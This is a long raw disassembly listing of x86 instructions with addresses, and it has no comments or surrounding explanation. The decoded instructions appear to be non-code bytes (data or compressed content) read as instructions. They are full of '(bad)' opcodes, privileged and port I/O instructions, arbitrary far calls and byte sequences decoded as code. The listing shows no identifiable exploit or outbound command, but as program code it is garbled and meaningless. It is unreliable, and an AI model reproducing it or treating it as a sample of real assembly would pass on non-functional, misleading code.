  4c2705:	mov    gs,WORD PTR [edi-0xfe281d0]
  4c270b:	into   
  4c270c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c270d:	outs   dx,BYTE PTR ds:[esi]
  4c270e:	inc    esi
  4c270f:	sub    BYTE PTR [esi-0x714a8cd1],cl
  4c2715:	xor    eax,0x1baad3ae
  4c271a:	push   esi
  4c271b:	adc    DWORD PTR [ebp+edx*2+0x3f39021f],esi
  4c2722:	out    dx,eax
  4c2723:	jnp    0x4c2796
  4c2725:	in     al,0x43
  4c2727:	pop    es
  4c2728:	ins    DWORD PTR es:[di],dx
  4c272a:	pop    ds
  4c272b:	je     0x4c26e0
  4c272d:	sbb    DWORD PTR [ebx+0x38af6990],ebp
  4c2733:	sub    BYTE PTR [edx],bl
  4c2735:	mov    dh,0xc6
  4c2737:	adc    ch,BYTE PTR [esi-0x5d]
  4c273a:	jae    0x4c27bb
  4c273c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c273d:	mov    eax,DWORD PTR [ebx-0x26]
  4c2740:	scas   al,BYTE PTR es:[edi]
  4c2741:	xor    ah,BYTE PTR [esi+0x7]
  4c2744:	jnp    0x4c2708
  4c2746:	mov    ebp,0xa2e381f7
  4c274b:	outs   dx,DWORD PTR ds:[esi]
  4c274c:	pop    ss
  4c274d:	fimul  DWORD PTR [edx]
  4c274f:	push   ds
  4c2750:	push   cs
  4c2751:	xor    BYTE PTR [edx],bh
  4c2753:	mov    ds:0xb66e0b33,eax
  4c2758:	xchg   cl,bl
  4c275a:	addr16 fs pop ss
  4c275d:	add    DWORD PTR [edx],eax
  4c275f:	vmwrite ebx,DWORD PTR [esi+0x4837f3e6]
  4c2766:	add    BYTE PTR [eax],cl
  4c2768:	test   al,0x36
  4c276a:	or     DWORD PTR [eax+0xa],edx
  4c276d:	push   ebx
  4c276e:	imul   edi,DWORD PTR [esi+0x2e1008e7],0x351135b0
  4c2778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c2779:	push   ebp
  4c277a:	call   0xe34:0x1335124a
  4c2781:	sbb    bh,cl
  4c2783:	sar    DWORD PTR [esi+ebx*4+0x40],cl
  4c2787:	sbb    eax,esi
  4c2789:	xor    ebx,DWORD PTR [edx]
  4c278b:	sbb    BYTE PTR [ebx],0x29
  4c278e:	int    0xf7
  4c2790:	cmp    al,0x10
  4c2792:	sbb    al,0x2e
  4c2794:	shl    BYTE PTR [edx],0x1e
  4c2797:	iret   
  4c2798:	push   ebx
  4c2799:	call   0x31b8:0x9e1f0eef
  4c27a0:	and    BYTE PTR [esi],cl
  4c27a2:	and    DWORD PTR [eax-0x62],esp
  4c27a5:	out    0x79,eax
  4c27a7:	call   0x7a20:0x793c782f
  4c27ae:	ds int 0xe7
  4c27b1:	jns    0x4c27b7
  4c27b3:	cld    
  4c27b4:	sub    BYTE PTR [esi-0x1],bh
  4c27b7:	in     al,0x2e
  4c27b9:	clc    
  4c27ba:	mov    ah,0x78
  4c27bc:	push   0x4d
  4c27be:	aaa    
  4c27bf:	add    ah,BYTE PTR [edi+0x66]
  4c27c2:	sbb    DWORD PTR [ebp+0xb],0xf656b73c
  4c27c9:	sub    ebx,DWORD PTR [ebx+0x3e7cd118]
  4c27cf:	sub    eax,DWORD PTR [eax]
  4c27d1:	sub    edx,DWORD PTR [edx-0x55]
  4c27d4:	dec    esp
  4c27d5:	jb     0x4c280e
  4c27d7:	sbb    al,0x81
  4c27d9:	into   
  4c27da:	bound  esi,QWORD PTR [edi-0xfd1f0f6]
  4c27e0:	jne    0x4c2769
  4c27e2:	jnp    0x4c27e7
  4c27e4:	(bad)  
  4c27e5:	outs   dx,BYTE PTR ds:[esi]
  4c27e6:	mov    bl,0x67
  4c27e8:	dec    ebx
  4c27e9:	ins    DWORD PTR es:[edi],dx
  4c27ea:	mul    ecx
  4c27ec:	jnp    0x4c2787
  4c27ee:	idiv   DWORD PTR [ebx-0x69]
  4c27f1:	imul   ebx,DWORD PTR [ebx-0x59c4f589],0xffffffa1
  4c27f8:	mov    ebp,0x45c36f3e
  4c27fd:	and    esp,DWORD PTR [ecx]
  4c27ff:	mov    bh,0x4b
  4c2801:	pop    ds
  4c2802:	sbb    al,0xec
  4c2804:	push   eax
  4c2805:	fwait
  4c2806:	cmp    ah,bh
  4c2808:	out    dx,eax
  4c2809:	mov    eax,ds:0xf0f15de4
  4c280e:	outs   dx,DWORD PTR ds:[esi]
  4c280f:	add    eax,0x1d070b2c
  4c2814:	push   ss
  4c2815:	add    al,0xe4
  4c2817:	in     al,0xb9
  4c2819:	in     al,0x96
  4c281b:	lea    ecx,[eax]
  4c281d:	mov    ss,WORD PTR [edx-0x7046d1b5]
  4c2823:	nop
  4c2824:	xchg   ecx,eax
  4c2825:	and    al,0x2f
  4c2827:	mov    ecx,0xb49392e4
  4c282c:	add    al,bl
  4c282e:	xchg   ecx,eax
  4c282f:	ja     0x4c27fa
  4c2831:	mov    ch,0x3
  4c2833:	sahf   
  4c2834:	or     DWORD PTR [eax],eax
  4c2836:	or     al,0xe7
  4c2838:	(bad)  
  4c2839:	sti    
  4c283a:	mov    ah,0x90
  4c283c:	jmp    0x756e:0x283f297b
  4c2843:	ins    BYTE PTR es:[edi],dx
  4c2844:	ins    BYTE PTR es:[edi],dx
  4c2845:	sti    
  4c2846:	pop    dx
  4c2848:	not    DWORD PTR [esi+eax*1]
  4c284b:	add    eax,0xe106201
  4c2850:	push   es
  4c2851:	add    dl,BYTE PTR [eax]
  4c2853:	add    al,0x45
  4c2855:	add    ch,ch
  4c2857:	mov    edi,0x35054aa2
  4c285c:	inc    esi
  4c285d:	push   eax
  4c285e:	push   ecx
  4c285f:	and    BYTE PTR [eax],bh
  4c2861:	push   eax
  4c2862:	pop    eax
  4c2863:	pop    es
  4c2864:	lods   al,BYTE PTR ds:[esi]
  4c2865:	aaa    
  4c2866:	(bad)  
  4c2867:	std    
  4c2868:	mov    ebx,0x573030f8
  4c286d:	push   eax
  4c286e:	pop    es
  4c286f:	cwde   
  4c2870:	and    ch,al
  4c2872:	or     BYTE PTR [eax+0x68],ah
  4c2875:	pusha  
  4c2876:	add    BYTE PTR [eax],al
  4c2878:	add    BYTE PTR [eax+0x70],bh
  4c287b:	js     0x4c28f4
  4c287d:	addr16 out 0x7d,al
  4c2880:	or     BYTE PTR [edi],al
  4c2882:	sub    al,BYTE PTR [edi]
  4c2884:	add    BYTE PTR [edx+eax*1],dh
  4c2887:	sbb    eax,0x7fd03fbb
  4c288c:	add    BYTE PTR [edi+0x6e],bl
  4c288f:	gs js  0x4c2906
  4c2892:	popa   
  4c2893:	data16 je 0x4c287e
  4c2896:	pop    edi
  4c2897:	ins    BYTE PTR es:[edi],dx
  4c2898:	outs   dx,DWORD PTR ds:[esi]
  4c2899:	bound  esp,QWORD PTR [bx]
  4c289c:	jns    0x4c290c
  4c289e:	aas    
  4c289f:	fstp   TBYTE PTR fs:[ecx+0x6]
  4c28a3:	xor    DWORD PTR [esi-0x39c18d9a],edi
  4c28a9:	ins    WORD PTR es:[edi],dx
  4c28ab:	mov    al,ds:0x6fa277df
  4c28b0:	mov    BYTE PTR [edi],dh
  4c28b2:	push   0x746f7079
  4c28b7:	push   cs
  4c28b8:	arpl   WORD PTR [ecx+0x62],sp
  4c28bb:	iret   
  4c28bc:	cmp    DWORD PTR [esi],ebp
  4c28be:	sti    
  4c28bf:	clc    
  4c28c0:	ins    BYTE PTR es:[edi],dx
  4c28c1:	fs aas 
  4c28c3:	cmp    al,0x30
  4c28c5:	dec    edi
  4c28c6:	sub    eax,0x76dfca60
  4c28cb:	push   cs
  4c28cc:	xchg   esi,eax
  4c28cd:	outs   dx,DWORD PTR ds:[esi]
  4c28ce:	jb     0x4c28ee
  4c28d0:	arpl   WORD PTR [ebp+0x69],sp
  4c28d3:	ins    BYTE PTR es:[edi],dx
  4c28d4:	(bad)  
  4c28d5:	ins    DWORD PTR es:[edi],dx
  4c28d6:	inc    eax
  4c28d7:	xor    DWORD PTR [edx],edi
  4c28d9:	push   0x6f
  4c28db:	ds imul esi,edx,0x6f777271
  4c28e2:	jnp    0x4c28be
  4c28e4:	sub    BYTE PTR [eax],0x61
  4c28e7:	xor    cl,BYTE PTR [edi]
  4c28e9:	pop    ds
  4c28ea:	inc    eax
  4c28eb:	setle  BYTE PTR [ebx]
  4c28ee:	push   0xc46748bb
  4c28f3:	outs   dx,DWORD PTR ds:[esi]
  4c28f4:	(bad)  
  4c28f7:	pop    es
  4c28f8:	out    dx,eax
  4c28f9:	sub    al,0xf
  4c28fb:	dec    esp
  4c28fc:	xor    DWORD PTR [eax],esi
  4c28fe:	(bad)  
  4c2900:	outs   dx,DWORD PTR ds:[esi]
  4c2901:	test   esi,ebp
  4c2903:	sbb    bh,BYTE PTR [eax]
  4c2905:	add    esp,DWORD PTR ss:[ebx+0x2]
  4c2909:	jns    0x4c2960
  4c290b:	push   ds
  4c290c:	mov    al,0x76
  4c290e:	aad    0x4e
  4c2910:	inc    esi
  4c2911:	data16 cmp BYTE PTR [edi],dl
  4c2914:	xor    cl,BYTE PTR [edx+ebx*1-0x63]
  4c2918:	clc    
  4c2919:	ds push edx
  4c291b:	add    BYTE PTR [edi],ah
  4c291d:	dec    esi
  4c291e:	inc    esi
  4c291f:	inc    ebx
  4c2920:	out    dx,eax
  4c2921:	mov    ebp,0x444aae69
  4c2926:	and    ebp,DWORD PTR [edx+0x63]
  4c2929:	push   ebp
  4c292a:	push   esp
  4c292b:	inc    esi
  4c292c:	sub    eax,0x39310e5f
  4c2931:	push   0x4c36dffb
  4c2936:	push   ecx
  4c2937:	push   ebp
  4c2938:	dec    esi
  4c2939:	dec    ecx
  4c293a:	inc    ebx
  4c293b:	dec    edi
  4c293c:	inc    esp
  4c293d:	adc    al,0x54
  4c293f:	pop    edx
  4c2940:	(bad)  
  4c2941:	fs nop
  4c2943:	inc    ecx
  4c2944:	push   es
  4c2945:	xchg   esp,eax
  4c2946:	mov    ds:0x641d0b0,al
  4c294b:	sbb    DWORD PTR [esi-0x7ade2534],edi
  4c2951:	adc    al,0xb2
  4c2953:	fild   WORD PTR [edx+edx*4+0x48521485]
  4c295a:	mov    al,ds:0x14cabcae
  4c295f:	push   edx
  4c2960:	dec    eax
  4c2961:	and    eax,ebx
  4c2963:	out    0xf4,al
  4c2965:	add    esp,ebp
  4c2967:	and    DWORD PTR [edi-0x6efeeffe],eax
  4c296d:	sbb    al,0x51
  4c296f:	dec    ebx
  4c2970:	add    esp,DWORD PTR [eax]
  4c2972:	adc    BYTE PTR [ebp+0x72],0xc8
  4c2976:	sub    BYTE PTR [eax],ah
  4c2978:	jb     0x4c299f
  4c297a:	add    ebp,ebp
  4c297c:	and    al,BYTE PTR [ebx]
  4c297e:	test   BYTE PTR [eax],dl
  4c2980:	add    eax,0x810725c8
  4c2985:	add    DWORD PTR [eax+0x10c9725c],eax
  4c298b:	add    BYTE PTR [edx],0x10
  4c298e:	jo     0x4c299c
  4c2990:	pop    ebx
  4c2991:	ja     0x4c29b3
  4c2993:	add    ebp,DWORD PTR [ecx+0x43]
  4c2996:	xchg   ecx,eax
  4c2997:	sbb    al,0x68
  4c2999:	add    DWORD PTR [ebx],eax
  4c299b:	jbe    0x4c2a0d
  4c299d:	test   BYTE PTR [eax+0x1],ah
  4c29a0:	add    eax,DWORD PTR [ecx]
  4c29a2:	add    eax,ecx
  4c29a4:	mov    dh,0x0
  4c29a6:	cdq    
  4c29a7:	add    dh,BYTE PTR [edi-0x41]
  4c29aa:	pop    ebp
  4c29ab:	test   al,0x82
  4c29ad:	push   ebp
  4c29ae:	inc    DWORD PTR [ebx]
  4c29b0:	adc    al,0x62
  4c29b2:	pop    es
  4c29b3:	pop    ebx
  4c29b4:	cmp    ebx,DWORD PTR [ebx]
  4c29b6:	aaa    
  4c29b7:	add    DWORD PTR [ecx],eax
  4c29b9:	add    BYTE PTR ds:0xd35f0da1,0xef
  4c29c0:	push   ds
  4c29c1:	push   ss
  4c29c2:	fimul  DWORD PTR [edx]
  4c29c4:	and    eax,DWORD PTR [eax]
  4c29c6:	or     edi,edi
  4c29c8:	(bad)  
  4c29c9:	(bad)  
  4c29ca:	inc    DWORD PTR [eax-0x7b7c7d7f]
  4c29d0:	test   DWORD PTR [esi-0x75767779],eax
  4c29d6:	mov    ecx,DWORD PTR [ebp+ecx*4-0x6e6f7072]
  4c29dd:	xchg   edx,eax
  4c29de:	xchg   ebx,eax
  4c29df:	xchg   esp,eax
  4c29e0:	xchg   ebp,eax
  4c29e1:	xchg   esi,eax
  4c29e2:	xchg   edi,eax
  4c29e3:	cwde   
  4c29e4:	cdq    
  4c29e5:	call   0xff9f:0x9e9d9c9b
  4c29ec:	(bad)  
  4c29ed:	(bad)  
  4c29ee:	jmp    DWORD PTR [eax-0x5b5c5d5f]
  4c29f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c29f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c29f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c29f7:	test   al,0xa9
  4c29f9:	stos   BYTE PTR es:[edi],al
  4c29fa:	stos   DWORD PTR es:[edi],eax
  4c29fb:	lods   al,BYTE PTR ds:[esi]
  4c29fc:	lods   eax,DWORD PTR ds:[esi]
  4c29fd:	scas   al,BYTE PTR es:[edi]
  4c29fe:	scas   eax,DWORD PTR es:[edi]
  4c29ff:	mov    al,0xb1
  4c2a01:	mov    dl,0xb3
  4c2a03:	mov    ah,0xb5
  4c2a05:	mov    dh,0xb7
  4c2a07:	mov    eax,0xbcbbbab9
  4c2a0c:	mov    ebp,0xffffbfbe
  4c2a11:	(bad)  
  4c2a12:	inc    eax
  4c2a14:	rol    edx,0xc3
  4c2a17:	(bad)  
  4c2a18:	(bad)
  4c2a1b:	enter  0xcac9,0xcb
  4c2a1f:	int3   
  4c2a20:	int    0xce
  4c2a22:	iret   
  4c2a23:	rcl    cl,1
  4c2a25:	rcl    bl,cl
  4c2a27:	aam    0xd5
  4c2a29:	(bad)  
  4c2a2a:	xlat   BYTE PTR ds:[ebx]
  4c2a2b:	fcomp  st(1)
  4c2a2d:	fcmovu st,st(3)
  4c2a2f:	(bad)  
  4c2a31:	(bad)  
  4c2a33:	(bad)  
  4c2a34:	(bad)  
  4c2a35:	(bad)  
  4c2a36:	jmp    eax
  4c2a38:	loope  0x4c2a1c
  4c2a3a:	jecxz  0x4c2a20
  4c2a3c:	in     eax,0xe6
  4c2a3e:	out    0xe8,eax
  4c2a40:	jmp    0xee39162f
  4c2a45:	out    dx,al
  4c2a46:	out    dx,eax
  4c2a47:	lock icebp 
  4c2a49:	repnz repz hlt 
  4c2a4c:	cmc    
  4c2a4d:	div    bh
  4c2a4f:	clc    
  4c2a50:	stc    
  4c2a51:	cli    
  4c2a52:	sti    
  4c2a53:	cld    
  4c2a54:	std    
  4c2a55:	(bad)  
  4c2a56:	dec    DWORD PTR [eax-0x7ea755eb]
  4c2a5c:	inc    ecx
  4c2a5d:	inc    ecx
  4c2a5e:	add    BYTE PTR [edx-0x73],ah
  4c2a61:	cmp    edi,0x550862a8
  4c2a67:	jmp    FWORD PTR [ecx]
  4c2a69:	mov    dh,0xe8
  4c2a6b:	(bad)  
  4c2a6c:	cmp    DWORD PTR [edi],0xc001e04
  4c2a72:	inc    DWORD PTR [edi+0x65]
  4c2a75:	cwde   
  4c2a76:	sub    dl,ch
  4c2a78:	outs   dx,DWORD PTR ds:[esi]
  4c2a79:	pop    ds
  4c2a7a:	push   edi
  4c2a7b:	imul   ebp,DWORD PTR [esi+0x64],0xffff4e6f
  4c2a82:	test   DWORD PTR [eax],0x73552e59
  4c2a88:	gs jb  0x4c2ada
  4c2a8b:	bound  ebp,QWORD PTR [edx+0x65]
  4c2a8e:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  4c2a92:	outs   dx,WORD PTR ds:[esi]
  4c2a94:	jb     0x4c2b03
  4c2a96:	lods   eax,DWORD PTR ds:[esi]
  4c2a97:	jecxz  0x4c2ad4
  4c2a99:	jge    0x4c2acc
  4c2a9b:	push   edi
  4c2a9c:	ss dec sp
  4c2a9f:	popa   
  4c2aa0:	mov    al,BYTE PTR [ecx+0x30]
  4c2aa3:	imul   ecx,esi,0x76e3b7b2
  4c2aa9:	gs push eax
  4c2aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c2aac:	jne    0x4c2b1e
  4c2aae:	daa    
  4c2aaf:	pop    ds
  4c2ab0:	lea    eax,[eax]
  4c2ab2:	dec    ebp
  4c2ab3:	add    ch,BYTE PTR [eax]
  4c2ab5:	(bad)  
  4c2ab6:	jmp    DWORD PTR [edx+0x42656761]
  4c2abc:	outs   dx,DWORD PTR ds:[esi]
  4c2abd:	js     0x4c2b16
  4c2abf:	mov    esi,0x87b38053
  4c2ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c2ac5:	into   
  4c2ac6:	push   edx
  4c2ac7:	sub    esi,DWORD PTR gs:[eax]
  4c2aca:	add    BYTE PTR [esi],cl
  4c2acc:	js     0x4c2b45
  4c2ace:	fbld   TBYTE PTR [edx+0x106c884]
  4c2ad4:	push   es
  4c2ad5:	add    BYTE PTR [eax+0x737ed386],0x6b
  4c2adc:	adc    BYTE PTR es:[edx],0x10
  4c2ae0:	add    eax,DWORD PTR [esi+0x5148082]
  4c2ae6:	add    eax,0x77850045
  4c2aeb:	loop   0x4c2aba
  4c2aed:	or     al,0x50
  4c2aef:	pop    eax
  4c2af0:	adc    BYTE PTR [eax-0x80],0x88
  4c2af4:	dec    edx
  4c2af5:	sub    BYTE PTR [edi],ah
  4c2af7:	cmp    BYTE PTR [esi],ch
  4c2af9:	lock daa 
  4c2afb:	ficom  DWORD PTR [eax+0x57]
  4c2afe:	inc    esi
  4c2aff:	pop    es
  4c2b00:	mov    eax,0x98885050
  4c2b05:	sub    BYTE PTR [edx+0x30cc37d9],al
  4c2b0b:	jb     0x4c2a93
  4c2b0d:	push   0xb09c0002
  4c2b12:	pop    ss
  4c2b13:	or     DWORD PTR [eax+edi*2+0x4777070],edi
  4c2b1a:	scas   eax,DWORD PTR es:[edi]
  4c2b1b:	dec    esi
  4c2b1c:	mov    al,0xe0
  4c2b1e:	mov    ebx,cr0
  4c2b21:	outs   dx,DWORD PTR ds:[esi]
  4c2b22:	ins    DWORD PTR es:[edi],dx
  4c2b23:	jo     0x4c2b91
  4c2b25:	push   eax
  4c2b26:	and    BYTE PTR gs:[ebp+0x57c14c20],ch
  4c2b2d:	lock add al,0x34
  4c2b30:	mov    dl,0x27
  4c2b32:	aaa    
  4c2b33:	ins    BYTE PTR es:[edi],dx
  4c2b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c2b35:	lock adc esp,DWORD PTR [eax]
  4c2b38:	js     0x4c2bad
  4c2b3a:	and    BYTE PTR [eax+0x69],cl
  4c2b3d:	out    0x8a,al
  4c2b3f:	jns    0x4c2b61
  4c2b41:	inc    esp
  4c2b42:	mov    ebp,0x805edf35
  4c2b47:	arpl   WORD PTR [edx+0x69],si
  4c2b4a:	jo     0x4c2b89
  4c2b4c:	add    BYTE PTR [eax],ah
  4c2b4e:	inc    edx
  4c2b4f:	gs dec ecx
  4c2b51:	inc    ecx
  4c2b52:	jb     0x4c2b14
  4c2b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c2b55:	and    eax,0x277946b6
  4c2b5a:	daa    
  4c2b5b:	pop    ebp
  4c2b5c:	and    BYTE PTR [eax+ebx*1+0x1a9bd8b8],ah
  4c2b63:	ss push esp
  4c2b65:	jns    0x4c2bd7
  4c2b67:	mov    DWORD PTR gs:[eax+0x62],esp
  4c2b6b:	loopne 0x4c2be4
  4c2b6d:	clc    
  4c2b6e:	adc    al,0x6c
  4c2b70:	and    BYTE PTR [ebx-0x3b],dh
  4c2b73:	arpl   WORD PTR [eax],sp
  4c2b75:	je     0x4c2bdf
  4c2b77:	jb     0x4c2bde
  4c2b79:	inc    eax
  4c2b7a:	rcl    al,1
  4c2b7c:	stos   BYTE PTR es:[edi],al
  4c2b7d:	and    BYTE PTR [edi+0x3c],0x64
  4c2b81:	cmp    ah,BYTE PTR [eax-0x44]
  4c2b84:	outs   dx,BYTE PTR ds:[esi]
  4c2b85:	xlat   BYTE PTR ds:[ebx]
  4c2b86:	lock push es
  4c2b88:	in     eax,dx
  4c2b89:	pop    esi
  4c2b8a:	push   ds
  4c2b8b:	jbe    0x4c2bbd
  4c2b8d:	mov    BYTE PTR [ebx-0x54],ah
  4c2b90:	jns    0x4c2b9a
  4c2b92:	or     ecx,esp
  4c2b94:	clc    
  4c2b95:	mov    dh,0x6e
  4c2b97:	pop    eax
  4c2b98:	jb     0x4c2c0f
  4c2b9a:	and    DWORD PTR [ecx+0x1c],ebp
  4c2b9d:	pop    ecx
  4c2b9e:	mov    ebp,0x60b7bb41
  4c2ba3:	inc    edi
  4c2ba4:	jbe    0x4c2c08
  4c2ba6:	(bad)  
  4c2ba7:	push   ebx
  4c2ba8:	push   edi
  4c2ba9:	push   0x9faa7683
  4c2bae:	fs jns 0x4c2ba7
  4c2bb1:	ins    DWORD PTR es:[edi],dx
  4c2bb2:	and    al,0x1e
  4c2bb4:	gs out dx,al
  4c2bb6:	cwde   
  4c2bb7:	stos   DWORD PTR es:[edi],eax
  4c2bb8:	sbb    DWORD PTR [esi],edi
  4c2bba:	and    BYTE PTR [esi+0x4b],bl
  4c2bbd:	pushw  es
  4c2bbf:	or     ebx,DWORD PTR [edx+0x4742ed62]
  4c2bc5:	mov    esp,0x698a6942
  4c2bca:	jp     0x4c2b51
  4c2bcc:	and    al,bh
  4c2bce:	mov    cl,0x65
  4c2bd0:	cmp    esp,DWORD PTR [eax+0x65]
  4c2bd3:	push   0x43462520
  4c2bd8:	stos   BYTE PTR es:[edi],al
  4c2bd9:	loopne 0x4c2c32
  4c2bdb:	and    eax,0xab6a581f
  4c2be0:	or     eax,0x9f4f4d26
  4c2be5:	fmul   DWORD PTR [eax]
  4c2be7:	push   esp
  4c2be8:	mov    eax,?
  4c2bea:	popa   
  4c2beb:	shl    BYTE PTR [ebp+0x6e],cl
  4c2bee:	mov    cl,0xc2
  4c2bf0:	div    BYTE PTR [eax]
  4c2bf2:	mov    ebp,0x565d5b07
  4c2bf7:	push   ds
  4c2bf8:	jae    0x4c2c6f
  4c2bfa:	(bad)  
  4c2bfb:	mov    ch,0xd5
  4c2bfd:	dec    esi
  4c2bfe:	or     BYTE PTR [edi+edi*1],bh
  4c2c01:	cmp    esp,DWORD PTR [eax+0x6c]
  4c2c04:	(bad)  
  4c2c05:	into   
  4c2c06:	outs   dx,DWORD PTR ds:[esi]
  4c2c07:	add    ch,al
  4c2c09:	push   ds
  4c2c0a:	popa   
  4c2c0b:	ins    BYTE PTR es:[edi],dx
  4c2c0c:	ins    BYTE PTR es:[edi],dx
  4c2c0d:	jae    0x4c2c78
  4c2c0f:	addr16 add ebp,0x2b
  4c2c13:	fdivr  QWORD PTR ds:0x77656e2f
  4c2c19:	adc    DWORD PTR [edi+0x6cb86676],esi
  4c2c1f:	ins    BYTE PTR es:[edi],dx
  4c2c20:	adc    BYTE PTR [eax+0x62],bl
  4c2c23:	cmp    BYTE PTR ds:0xb6d94791,cl
  4c2c29:	sti    
  4c2c2a:	dec    ebx
  4c2c2b:	push   ds
  4c2c2c:	push   edx
  4c2c2d:	push   esp
  4c2c2e:	push   esp
  4c2c2f:	dec    ecx
  4c2c30:	test   DWORD PTR [ebp+0x48],0xf2647506
  4c2c37:	xchg   edi,edx
  4c2c39:	mov    WORD PTR [eax+0x6ed4e848],es
  4c2c3f:	enter  0x3b60,0x14
  4c2c43:	stos   DWORD PTR es:[edi],eax
  4c2c44:	popa   
  4c2c45:	mov    ch,0x8d
  4c2c47:	fild   QWORD PTR [edi+0x46e1a05a]
  4c2c4d:	dec    esi
  4c2c4e:	jge    0x4c2c8f
  4c2c50:	and    eax,0x697fc715
  4c2c56:	jb     0x4c2c80
  4c2c58:	push   0xffffff8a
  4c2c5a:	sbb    dl,dl
  4c2c5c:	lock imul esi,DWORD PTR fs:[ebx+0x45],0xa80f70e8
  4c2c65:	bound  eax,QWORD PTR [eax-0x4f]
  4c2c68:	fistp  QWORD PTR [edi-0x5a]
  4c2c6b:	ret    
  4c2c6c:	push   eax
  4c2c6d:	inc    ebp
  4c2c6e:	outs   dx,DWORD PTR ds:[esi]
  4c2c6f:	jae    0x4c2cd5
  4c2c71:	inc    edx
  4c2c72:	imul   eax,DWORD PTR fs:[edi-0x6ecd1af4],0x7f
  4c2c7a:	ins    DWORD PTR es:[edi],dx
  4c2c7b:	shl    eax,0x22
  4c2c7e:	mov    eax,0x746c7561
  4c2c83:	push   ebp
  4c2c84:	mov    edi,0xb1583b13
  4c2c89:	jg     0x4c2d04
  4c2c8b:	sub    esp,DWORD PTR [eax-0x56]
  4c2c8e:	push   ecx
  4c2c8f:	jne    0x4c2d02
  4c2c91:	push   ss
  4c2c92:	or     DWORD PTR [edi+0x59],esp
  4c2c95:	cmp    eax,0x2fdd57b6
  4c2c9a:	je     0x4c2c5a
  4c2c9c:	outs   dx,DWORD PTR ds:[esi]
  4c2c9d:	xchg   WORD PTR [edi],si
  4c2ca0:	daa    
  4c2ca1:	cmp    eax,0x9770add6
  4c2ca6:	mov    bl,0x27
  4c2ca8:	popw   ss
  4c2caa:	pop    esi
  4c2cab:	cmp    eax,0xa79ff35e
  4c2cb0:	push   es
  4c2cb1:	jl     0x4c2cd9
  4c2cb3:	cmp    al,0x3c
  4c2cb5:	cmp    eax,0x253e3e00
  4c2cba:	push   ss
  4c2cbb:	das    
  4c2cbc:	div    DWORD PTR [edi+ecx*8-0xd]
  4c2cc0:	push   es
  4c2cc1:	sub    eax,0x7c472a2b
  4c2cc6:	es push cs
  4c2cc8:	out    dx,al
  4c2cc9:	xor    al,0xdf
  4c2ccb:	jae    0x4c2d34
  4c2ccd:	push   es
  4c2cce:	jle    0x4c2cde
  4c2cd0:	sub    BYTE PTR [ecx],ch
  4c2cd2:	sub    al,0x64
  4c2cd4:	sahf   
  4c2cd5:	data16 scas al,BYTE PTR es:[edi]
  4c2cd7:	xchg   edi,eax
  4c2cd8:	fstp   TBYTE PTR [edi+eax*4]
  4c2cdb:	add    al,0x7e
  4c2cdd:	add    BYTE PTR [eax],al
  4c2cdf:	scas   eax,DWORD PTR es:[edi]
  4c2ce0:	push   ebx
  4c2ce1:	sahf   
  4c2ce2:	jge    0x4c2d22
  4c2ce4:	sub    ah,BYTE PTR [esi+0x16]
  4c2ce7:	sub    eax,DWORD PTR [edi]
  4c2ce9:	sub    eax,0x70662b9e
  4c2cee:	fdivr  DWORD PTR [ebx]
  4c2cf0:	aaa    
  4c2cf1:	push   es
  4c2cf2:	mov    dl,BYTE PTR [edi+0x6839f200]
  4c2cf8:	je     0x4c2d49
  4c2cfa:	and    DWORD PTR [esi],edx
  4c2cfc:	cmp    eax,0x68e90021
  4c2d01:	inc    esp
  4c2d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c2d03:	add    BYTE PTR [edi-0x544a1e69],bl
  4c2d09:	cmp    ebx,DWORD PTR [edi-0x3d918aa1]
  4c2d0f:	addr16 sbb al,0x64
  4c2d12:	push   ss
  4c2d13:	jb     0x4c2cd6
  4c2d15:	fstp   TBYTE PTR [edx]
  4c2d17:	shl    DWORD PTR ds:0x12702f69,cl
  4c2d1d:	ss xor al,0xe
  4c2d20:	gs mov ah,0xf1
  4c2d23:	or     al,0x1a
  4c2d25:	pop    esp
  4c2d26:	imul   ebx,DWORD PTR [edi],0x67f572d0
  4c2d2c:	or     esi,edx
  4c2d2e:	test   DWORD PTR [esp+ecx*1+0x4e],0x68741619
  4c2d36:	imul   esi,DWORD PTR [ebx+0x2a],0x58f73221
  4c2d3d:	fs inc edi
  4c2d3f:	jo     0x4c2da2
  4c2d41:	sub    eax,0x63572cc7
  4c2d46:	xchg   DWORD PTR [ebx],esi
  4c2d48:	jl     0x4c2d58
  4c2d4a:	jmp    DWORD PTR [eax+ebp*1+0x2b]
  4c2d4e:	fcomp  DWORD PTR [esi+0x49a6bde7]
  4c2d54:	push   ss
  4c2d55:	rol    BYTE PTR [esi],1
  4c2d57:	les    ecx,FWORD PTR [esi]
  4c2d59:	mov    eax,0x9e79a0ac
  4c2d5e:	out    0x79,eax
  4c2d60:	xchg   esp,eax
  4c2d61:	mov    WORD PTR [eax+edi*2+0x4f9b346c],es
  4c2d68:	repz xchg edx,eax
  4c2d6a:	dec    esp
  4c2d6b:	fs pop esp
  4c2d6d:	dec    ecx
  4c2d6e:	cwde   
  4c2d6f:	cs pop eax
  4c2d71:	out    0x79,eax
  4c2d73:	sahf   
  4c2d74:	not    DWORD PTR [esi+eax*1+0x50]
  4c2d78:	dec    esp
  4c2d79:	dec    eax
  4c2d7a:	inc    esp
  4c2d7b:	sahf   
  4c2d7c:	out    0x79,eax
  4c2d7e:	sahf   
  4c2d7f:	cmp    BYTE PTR [eax+esi*1],dh
  4c2d82:	sub    al,0x28
  4c2d84:	and    al,0x79
  4c2d86:	sahf   
  4c2d87:	out    0x79,eax
  4c2d89:	and    BYTE PTR [eax+ebx*1],bl
  4c2d8c:	adc    al,0x10
  4c2d8e:	repz jns 0x4c2d2f
  4c2d91:	out    0xc,eax
  4c2d93:	or     BYTE PTR [eax+eax*1],al
  4c2d96:	cld    
  4c2d97:	dec    eax
  4c2d98:	iret   
  4c2d99:	repz cmp al,0x4f
  4c2d9c:	clc    
  4c2d9d:	hlt    
  4c2d9e:	lock in al,dx
